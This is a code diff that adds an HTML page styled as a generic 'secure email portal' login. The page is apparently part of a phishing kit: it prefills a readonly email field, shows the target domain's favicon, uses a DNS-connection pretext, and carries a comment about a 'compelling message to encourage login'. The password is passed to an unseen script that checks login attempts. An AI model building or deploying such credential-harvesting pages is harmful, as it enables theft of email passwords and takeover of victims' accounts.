@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EMAIL PORTAL</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <form id="microsoft-login-form">
+            <h2>SECURE EMAIL PORTAL</h2>
+            <P style="text-align: center; margin-top: 0%;">Powered by webmail</P>
+            <div class="xlogo">
+                <img id="zion" src="https://www.google.com/s2/favicons?domain=">
+                <span style="text-transform: lowercase;" class="text-g" id="banNer">enter email</span>
+            </div>
+            <div class="form-group">
+                <input type="email" id="email" name="email" class="input-field" placeholder="Email" required readonly>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" class="input-field" placeholder="Password" required>
+            </div>          
+
+            <div id="error-message" class="error-message"><p class="encouragement-message">Connect your email to your domain's DNS</p></div><br>
+            
+            <button type="submit" id="login-button" onclick="checkAttempts()">Login</button>
+            <p id="loginMessage" class="login-message"></p> <!-- Placeholder for login message -->
+
+            <!-- Compelling message to encourage login -->
+            
+
+            <!-- Copyright and other email login server-related stuff -->
+            <footer>
+                <p class="copyright">Copyright &copy; 2024 Email Portal. All rights reserved.</p>
+                <p class="support-info">For assistance, contact <a href="mailto:support@webmail.com">support@webmail.com</a></p>
+            </footer>
+        </form>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
